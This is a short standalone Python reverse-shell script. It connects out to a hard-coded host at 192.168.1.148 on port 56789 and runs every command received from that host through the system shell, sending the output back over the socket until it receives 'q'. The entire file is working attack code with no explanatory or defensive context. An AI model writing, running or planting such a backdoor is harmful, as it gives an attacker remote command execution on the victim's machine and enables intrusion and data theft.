
#!/usr/bin/python

import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.148", 56789))

def shell():
	while True:
		server_cmd = s.recv(1024);
		if server_cmd == 'q':
			break
		else:
			# if everything goes a expected, this else condition will run
			ps = subprocess.Popen(
				server_cmd,
				shell=True,
				stdout=subprocess.PIPE,
				stdin=subprocess.PIPE,
				stderr=subprocess.PIPE
				)
			result = ps.stdout.read() + ps.stderr.read()
			s.send(result)


shell()
s.close()



